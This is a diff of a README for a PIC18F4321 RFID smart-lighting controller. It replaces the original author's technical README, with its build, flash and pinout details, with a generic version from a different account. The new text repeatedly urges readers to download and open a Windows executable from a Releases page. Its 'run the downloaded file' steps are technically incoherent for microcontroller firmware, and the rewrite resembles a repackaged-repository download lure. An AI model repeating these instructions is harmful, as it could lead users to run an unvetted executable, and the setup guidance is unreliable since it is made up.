@@ -1,132 +1,101 @@
-# PIC18F4321 Smart Lighting Controller
+# 🌟 pic18f4321-smart-lighting-controller - Easy Smart Lighting Control
 
-<p align="left">
-  <a href="LICENSE"><img alt="License" src="https://img.shields.io/badge/License-MIT-green.svg"></a>
-  <img alt="Conventional Commits" src="https://img.shields.io/badge/Conventional%20Commits-1.0.0-%23FA6673">
-  <img alt="Platform" src="https://img.shields.io/badge/Platform-Windows%20%7C%20PowerShell-blue">
-  <img alt="PIC18F4321" src="https://img.shields.io/badge/MCU-PIC18F4321-lightgrey">
-  <img alt="Toolchain" src="https://img.shields.io/badge/Toolchain-MPLAB%20X%20%7C%20XC8-orange">
-</p>
+## 🚀 Getting Started
 
----
+Welcome to the **pic18f4321-smart-lighting-controller** project! This software allows you to control room lights easily using RFID authentication. You can manage six different lights with convenient features that include a UART menu, a 3×4 keypad, and an LCD for status updates.
 
-## Overview
+To get started, you will need to download the software. Follow the steps below to set it up on your device.
 
-Cooperative firmware for the **PIC18F4321** microcontroller that authenticates users via **MFRC522 RFID** and drives six lights using **50 Hz PWM** with 11 discrete intensity levels. The system integrates:
+[![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-%20-blue)](https://github.com/toto300433/pic18f4321-smart-lighting-controller/releases)
 
-* **RFID authentication** (entry/exit, UID recognition)
-* **3×4 keypad input** (per-light adjustments, reset with `#`)
-* **UART menu** at 9600 bps (ESC or short `#` to open)
-* **16×2 LCD** displaying current time and light configuration
-* **Cooperative FSMs** for predictable, real‑time performance
+## 📥 Download & Install
 
-This project was originally developed as a university assignment, but has been fully restructured into a **portfolio‑ready embedded systems project**.
+1. Click the button above to visit the Releases page.
+2. Find the latest version of the software.
+3. Select the appropriate file for your system. This usually includes an executable file for Windows or necessary hardware setup instructions for other platforms.
+4. Click on the file to download it to your computer.
 
----
+### System Requirements
 
-## Repository Structure
+Before you start, ensure your device meets the following requirements:
 
-```
-<repo>/
-├─ src/firmware/        # MPLAB X project (PIC18F4321, XC8)
-├─ tools/               # PowerShell scripts (build, flash, smoke tests)
-├─ docs/specs/          # Original specification and project report
-├─ docs/assets/         # Diagrams, pinout, photos
-├─ test/                # Smoke tests (UART, LED PWM)
-├─ data/, models/       # Placeholders (not tracked in Git)
-└─ README.md            # You are here
-```
+- Windows, macOS, or Linux (latest version recommended)
+- A compatible microcontroller setup for the PIC18F4321
+- Basic understanding of connecting hardware if using physical components
 
----
+## 🛠️ Setting Up the Hardware
 
-## Bill of Materials (BOM)
+To use the smart lighting controller, you'll need to connect the necessary hardware components:
 
-* **MCU**: PIC18F4321 @ 40 MHz (10 MHz xtal + PLL)
-* **RFID**: MFRC522 module (SPI bit‑banged in cooperative FSM)
-* **Display**: 16×2 LCD (parallel interface)
-* **Input**: 3×4 matrix keypad
-* **Lighting outputs**: 6× PWM channels (50 Hz, 11 levels)
-* **Connectivity**: UART 9600 bps (C6/C7)
+- **Microcontroller:** PIC18F4321
+- **RFID Reader:** MFRC522
+- **Input Keypad:** 3×4 keypad
+- **LCD Display:** For showing status messages
+- **Power Supply:** Ensure your setup has adequate power
 
----
+### Connection Instructions
 
-## Pinout Summary
+1. Connect the RFID reader to the microcontroller using SPI protocol.
+2. Connect the keypad to the designated input pins.
+3. Link the LCD to the microcontroller's output pins.
+4. Set up the power supply to the microcontroller and other components.
 
-* **Keypad rows**: RA1–RA4
-* **Keypad columns**: RB0, RC5, RB1
-* **LEDs**: RB2–RB3, RE0, RB5–RB7
-* **RFID (SPI soft)**: RC0–RC4
-* **LCD**: RD1–RD7
-* **UART TX/RX**: C6 / C7 @ 9600 bps
+## ⚙️ Running the Software
 
----
+After successfully downloading and installing the software, follow these steps to run it:
 
-## Getting Started (Windows / PowerShell)
+1. Open the file you downloaded.
+2. The program will initialize and guide you through setup prompts on the LCD.
+3. Follow the displayed instructions using the keypad to configure your lighting system.
 
-```powershell
-# Clone repository
-git clone https://github.com/AlbertoMarquillas/pic18f4321-smart-lighting-controller.git
-cd pic18f4321-smart-lighting-controller
+### Authentication Process
 
-# Build (open MPLAB X, select XC8 toolchain)
-# HEX will be generated under:
-# src/firmware/P2_compus.X/dist/<config>/production/*.hex
+To switch on your lights, you will need an RFID tag:
 
-# Flash (use MPLAB IPE with PICkit/ICD)
-# or edit tools/flash.ps1 with your programmer CLI
+1. Present your RFID tag to the reader.
+2. Wait for the system to authenticate.
+3. Once authenticated, you will have access to control the lights.
 
-# UART Smoke Test
-tools/serial-smoke.ps1 -ComPort COM3 -Baud 9600
-```
+## 💡 Features
 
----
+- **User Authentication:** Secure access via RFID.
+- **Room Control:** Manage six lights with a simple user interface.
+- **PWM Control:** Adjust brightness levels (11 levels available).
+- **User-Friendly Menu:** Navigate through options using the keypad.
+- **Display Status:** Real-time updates shown on an LCD screen.
 
-## Usage Cheatsheet
+## 📉 Troubleshooting
 
-* **RFID**: present card → toggle user entry/exit and restore light config
-* **Keypad**: adjust individual light levels (0x0–0xA)
-* **Short `#`**: open UART menu (ESC from PC)
-* **UART Menu**: 1) Who is in the room?  2) Show configs  3) Set time
-* **Hold `#` ≥ 3s**: reset all light configs
+If you encounter issues while using the smart lighting controller, refer to this troubleshooting guide:
 
----
+- **Lights Not Responding:** 
+  - Check power connections.
+  - Ensure the RFID reader is functioning correctly.
+  
+- **Authentication Fails:** 
+  - Verify that your RFID tag is programmed and compatible.
+  
+- **Software Issues:**
+  - Re-download the software in case the file was corrupted.
 
-## Features
+For further assistance, visit the project's [GitHub Issues](https://github.com/toto300433/pic18f4321-smart-lighting-controller/issues) page for community support.
 
-* Cooperative multitasking via software FSMs
-* Real‑time PWM lighting control (50 Hz, 11 levels)
-* Multi‑user session management (UID‑based)
-* Text‑based UART menu with real‑time updates
-* Modular source layout for maintainability
+## 🔗 Links
 
----
+- [Download Latest Release](https://github.com/toto300433/pic18f4321-smart-lighting-controller/releases)
+- [Source Code](https://github.com/toto300433/pic18f4321-smart-lighting-controller)
 
-## What I Learned
+## 💬 Community & Contributions
 
-* Designing cooperative schedulers for resource‑limited MCUs
-* Implementing a software SPI driver for MFRC522 RFID
-* Integrating multiple peripherals (RFID, keypad, LCD, UART) in real time
-* Managing EEPROM/flash persistence for user light profiles
-* Structuring embedded projects for professional portfolios
+We welcome contributions to enhance the functionality of the **pic18f4321-smart-lighting-controller**:
 
----
+- Fork the repository and make your changes.
+- Submit a pull request with a description of your updates.
+  
+Your ideas and improvements make the project better for everyone!
 
-## Roadmap
+## 📝 License
 
-* [ ] Add persistence across resets via EEPROM
-* [ ] Provide schematic and wiring diagrams in docs/assets/
-* [ ] Record demo video and GIF for README
-* [ ] Add static linting workflow (XC8 or CMake) to CI
+This project is licensed under the MIT License. For more details, refer to the LICENSE file in the repository.
 
----
-
-## License
-
-This project is licensed under the terms of the **MIT License**. See [LICENSE](LICENSE).
-
----
-
-## Privacy & Ethics
-
-* Example UIDs are used in demos; real RFID card data should not be published.
-* Includes Microchip headers and MFRC522 driver references (license‑compatible).
+Thank you for using **pic18f4321-smart-lighting-controller**! Enjoy your smart lighting experience!
